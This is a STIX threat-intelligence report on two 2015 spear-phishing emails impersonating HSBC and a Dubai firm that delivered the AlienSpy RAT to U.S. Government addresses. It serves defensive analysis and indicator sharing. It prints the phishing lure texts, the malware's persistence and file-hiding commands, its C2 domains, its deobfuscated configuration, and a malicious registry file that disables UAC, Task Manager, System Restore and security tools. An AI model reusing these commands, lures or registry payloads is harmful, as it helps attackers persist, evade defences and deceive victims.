stix:STIX_Header.stix:Title: Spear Phishing Email with Payment Advice Theme Contains AlienSpy RAT
stix:STIX_Header.stix:Description:
Between 11 and 12 April 2015 at least two U.S. Government email addresses were targeted by two different spear-phishing emails that contained the AlienSpy remote administration tool (RAT). One was from dey@eskayyarntex.com with the subject "Payment Advice - Advice Ref:[G410398732] / Priority payment /Customer Ref:[498800000]" and the malicious attachment hsbc tt.jar (MD5: E76742ABA90C0A176C9E4070DB5D2B61). This email was made to appear from the legitimate company HSBC.
The other email was from Rachel.T@groupmail.com with the subject "RFQ 004100" and the malicious attachment RFQ#044.jar (MD5: 9D745E6CFA43E4C7DDB12BE5D2F0C468). This email was made to appear from the legitimate UAE business German Gulf.
Upon successful execution of the malware, it makes changes to the registry, checks for virtual machines (VMs) and antivirus (AV), and then sends GET requests to dsiminski.no-ip.org (5.254.106.196) and mega5checker.mooo.com (5.254.106.253).

stix:Indicator.indicator:Description:
----- START EMAIL HEADER 1----- EHLO mail2.eqx.gridhost.co.uk MAIL FROM:<dey@eskayyarntex.com> SIZE=92322 RCPT TO:[REDACTED] DATA Received: from [95.142.156.11] (helo=webmail.gridhost.co.uk) by mail2.eqx.gridhost.co.uk with esmtpa (Exim 4.72) (envelope-from <dey@eskayyarntex.com>) id 1YhNs1-0005vw-Ku; Sun, 12 Apr 2015 20:48:41 +0100 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="=_b2903bdfe83f438b2b7186a04395145c" Date: Sun, 12 Apr 2015 20:48:41 +0100 From: HSBC <dey@eskayyarntex.com> To: undisclosed-recipients:; Subject: Payment Advice - Advice Ref:[G410398732] / Priority payment / Customer Ref:[498800000] Return-Receipt-To: HSBC <dey@eskayyarntex.com> Disposition-Notification-To: HSBC <dey@eskayyarntex.com> Message-ID: <625e6df577c44b5b2c9539726b2653b1@eskayyarntex.com> X-Sender: dey@eskayyarntex.com User-Agent: Roundcube Webmail/0.9.0 X-Gridhost-Auth2: dey@eskayyarntex.com ----- END EMAIL HEADER 1 ----- ----- START EMAIL BODY 1 ----- Dear Sir/Madam, The attached payment advice is issued at the request of our customer. The advice is for your reference only. Yours faithfully, Global Payments and Cash Management HSBC ----- END EMAIL BODY 1 -----
HSBC is a British multinational banking and financial services company headquartered in London, England, United Kingdom. It is the world's third largest bank by assets, according to open source reporting.

EmailMessageObj:Header.EmailMessageObj:Subject: Payment Advice - Advice Ref:[G410398732] / Priority payment / Customer Ref:[498800000]

stix:Indicator.indicator:Description:
This .jar file is obfuscated with Allatori, a Java obfuscator and contains the AlienSpy RAT. The file "hsbc tt.jar" is executed with the following command: "java -jar" "C:\Documents and Settings\[USER]\Desktop\hsbc tt.jar"
The following command is run:
xcopy "C:\Program Files\Java\jre6" "C:\Documents and Settings\[USER]\9qLK6xx7oz\" /e,
This copies directory "C:\Program Files\Java\jre6" to "C:\Documents and Settings\[USER]\9qLK6xx7oz\".
The malware executes the following commands to hide the files and folder: attrib +h "C:\Documents and Settings\[USER]\9qLK6xx7oz\*.*" attrib +h" "C:\Documents and Settings\[USER]\9qLK6xx7oz"
The following file is written: "C:\Documents and Settings\[USER]\7eSeQqn5HqU.tmp"
The malware makes the following changes to the key registry: "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v z7vhFWZxHH /t REG_SZ /d "\"C:\Documents and Settings\[USER]\9qLK6xx7oz\bin\javaw.exe\" -jar \"C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\MXpO16jOgZ.fppwJ\"" /f"
The following registry key is deleted using the following command: "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v z7vhFWZxHH /f"
The following file is written: "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\MXpO16jOgZ.fppwJ"
This is a copy of "hsbc tt,jar". Then, "C:\Documents and Settings\[USER]\7eSeQqn5HqU.tmp" is deleted.
The malware executes the following commands to hide the files and folder: attrib +h "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz" attrib +h "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\*.*"
The malware launches a new process with the command: "C:\Documents and Settings\[USER]\9qLK6xx7oz\bin\javaw.exe" -jar "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\MXpO16jOgZ.fppwJ"
This new process performs a DNS query to dsiminski.no-ip.org and attempts to connect to port 1977. If the connection is successful, it sends data.

This is a malicious XML file that contains malware configuration settings extracted from hsbc tt.jar (MD5: E76742ABA90C0A176C9E4070DB5D2B61). The deobfuscated contents of the file are:
--------- <?xml version="1.0" encoding="UTF-8" standalone="no"?> <!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd"> <properties> <comment>Java Software</comment> <entry key="DNS">dsiminski.no-ip.org</entry> <entry key="PORT">1977</entry> <entry key="JAR_EXTENSION">fppwJ</entry> <entry key="JAR_FOLDER">9qLK6xx7oz</entry> <entry key="INSTALL_TIME">2000</entry> <entry key="JAR_REGISTRY">z7vhFWZxHH</entry> <entry key="RECONNECTION_TIME">2000</entry> <entry key="MUTEX">7eSeQqn5HqU</entry> <entry key="VBOX">false</entry> <entry key="NICKNAME">chiji</entry> <entry key="VMWARE">false</entry> <entry key="CONNECTION_TIME">2000</entry> <entry key="PLUGIN_FOLDER">N3uC5YtcWT</entry> <entry key="INSTALL">true</entry> <entry key="JAR_NAME">MXpO16jOgZ</entry> <entry key="PLUGIN_EXTENSION">vLxQo</entry> </properties> ----------

----- START EMAIL HEADER 2 ----- EHLO server.f7trading.com MAIL FROM:<Rachel.T@groupmail.com> SIZE=183831 RCPT TO;[REDACTED] DATA Received: from [172.245.45.49] (port=51370 helo=cf-173-245-48-119.cloudflare.com) by server.f7trading.com with esmtpsa (TLSv1:DHE-RSA-AES256-SHA:256) (Exim 4.85) (envelope-from <Rachel.T@groupmail.com>) id 1Yh1I5-0005aZ-2m for [REDACTED]; Date: Sat, 11 Apr 2015 15:42:06 -0400 From: [REDACTED] Rachel.T@groupmail.com To: [REDACTED] Content-Type: multipart/mixed; boundary="jmG6Td=_cfYpXEiMKpNUun5q4pAZtDMCoF" Subject: RFQ 004100 ----- END EMAIL HEADER 2----- ----- START EMAIL BODY 2 ----- Pls, Kindly request to send me your best quotation for 1440 psi 42"X10" as attached drawing & full Specification list.
Looking forward to your prompt reply. Best Regards, [REDACTED] ************************************************************************************** This email (and attachments if any) is intended only for the use of the individual or entity to which it is addressed, and may contain information that is confidential or privileged and exempt from disclosure under applicable law. If the reader of this email is not the intended recipient, or the employee or agent responsible for delivering this message to the intended recipient, you are hereby notified that any dissemination, distribution or copying of this communication is strictly prohibited. If you have received this communication in error, please notify the sender immediately by return email and destroy all copies of the email (and attachments if any). ----- END EMAIL BODY 2 -----
German-gulf is a company located in Dubai that consists of trading and engineering of heavy equipment and construction products and services to include oil & gas, aviation, ship building, marine engineering, and hospitality industries, according to their website.

This .jar file is obfuscated with Allatori, a Java obfuscator and contains the AlienSpy RAT. The file "RFQ#044.jar" is executed with the following command: "java -jar "C:\Documents and Settings\[USER]\Desktop\RFQ#044.jar""
The following process is created: xcopy ""C:\Program Files\Java\jre6"" ""C:\Documents and Settings\[USER]\HmCuCoeEGt\"" /e
This copies directory "C:\Program Files\Java\jre6" to "C:\Documents and Settings\[USER]\ HmCuCoeEGt \"
The malware executes the following commands, which set the hidden attribute of the files and folder: attrib +h "C:\Documents and Settings\[USER]\HmCuCoeEGt\*.*" attrib +h "C:\Documents and Settings\[USER]\HmCuCoeEGt"
The following file is written and deleted: "C:\Documents and Settings\[USER]\3Y1flC7QuSz.tmp"
The following command is run and information is created and deleted in the registry: "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v fEckgGX33k /t REG_SZ /d "\"C:\Documents and Settings\[USER]\HmCuCoeEGt\bin\javaw.exe\" -jar \"C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\YpuOm6eCQa.f1Ktq\"" /f"
The following file is written: "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\YpuOm6eCQa.f1Ktq"
This is a copy of "RFQ#044.jar".
The malware executes the following commands which hides the files and folder: attrib +h "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt" attrib +h "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\*.*"
The malware launches a new process with the command: "C:\Documents and Settings\[USER]\HmCuCoeEGt\bin\javaw.exe" -jar "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\YpuOm6eCQa.f1Ktq"
This new process executes the following command: "cmd.exe /c regedit /s C:\DOCUME~1\[USER]\LOCALS~1\Temp\TaskNetworkGathor5999777067308635012.reg"
The new process also performs a DNS query for mega5checker.mooo.com and attempts to connect to port 1030. If the connection is successful, it sends data.

This is a malicious XML file that contains malware configuration settings from the attachment RFQ#044.jar (MD5: 9D745E6CFA43E4C7DDB12BE5D2F0C468). The deobfuscated contents of the file are:
--------- <?xml version="1.0" encoding="UTF-8" standalone="no"?> <!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd"> <properties> <comment>Java Software</comment> <entry key="VMWARE">true</entry> <entry key="malw">true</entry> <entry key="PLUGIN_EXTENSION">Q0Pmy</entry> <entry key="PORT">1030</entry> <entry key="proex">true</entry> <entry key="unthreat">true</entry> <entry key="INSTALL">true</entry> <entry key="INSTALL_TIME">2000</entry> <entry key="ikarus">true</entry> <entry key="JAR_FOLDER">HmCuCoeEGt</entry> <entry key="JAR_EXTENSION">f1Ktq</entry> <entry key="windef">true</entry> <entry key="resys">true</entry> <entry key="outpost">true</entry> <entry key="escan">true</entry> <entry key="bull">true</entry> <entry key="clam">true</entry> <entry key="norton">true</entry> <entry key="taskmgr">true</entry> <entry key="mc">true</entry> <entry key="trend">true</entry> <entry key="fprot">true</entry> <entry key="super">true</entry> <entry key="RECONNECTION_TIME">2000</entry> <entry key="wire">true</entry> <entry key="prohac">true</entry> <entry key="CONNECTION_TIME">2000</entry> <entry key="k7">true</entry> <entry key="ahnlab">true</entry> <entry key="spybot">true</entry> <entry key="vipre">true</entry> <entry key="quickheal">true</entry> <entry key="JAR_REGISTRY">fEckgGX33k</entry> <entry key="MUTEX">3Y1flC7QuSz</entry> <entry key="adaware">true</entry> <entry key="norman">true</entry> <entry key="uac">true</entry> <entry key="gdata">true</entry> <entry key="mcshield">true</entry> <entry key="panda">true</entry> <entry key="immunet">true</entry> <entry key="fsecure">true</entry> <entry key="PLUGIN_FOLDER">D4xFpDxDRT</entry> <entry key="DNS">mega5checker.mooo.com</entry> <entry key="comodo">true</entry> <entry key="nano">true</entry> <entry key="JAR_NAME">YpuOm6eCQa</entry> <entry key="VBOX">false</entry> <entry key="baidu">true</entry> <entry key="NICKNAME">OWO</entry> </properties> -------------------

This is a malicious WINDOWS registry file. Once the commands are run the details from the file are added to the registry. Each time the user attempts to launch a program in the list below, "svchost.exe" will be launched instead:
-------- Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System] "ConsentPromptBehaviorAdmin"=dword:00000000 "ConsentPromptBehaviorUser"=dword:00000000 "EnableLUA"=dword:00000000 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UserAccountControlSettings.exe] "debugger"="svchost.exe" [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] "DisableTaskMgr"=dword:00000002 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Taskmgr.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore] "DisableConfig"=dword:00000001 "DisableSR"=dword:00000001 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCui.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MsMpEng.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MpUXSrv.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MpCmdRun.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdAwareService.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdAwareTray.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WebCompanion.exe] "debugger"="svchost.exe" [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdAwareDesktop.exe] --------------------
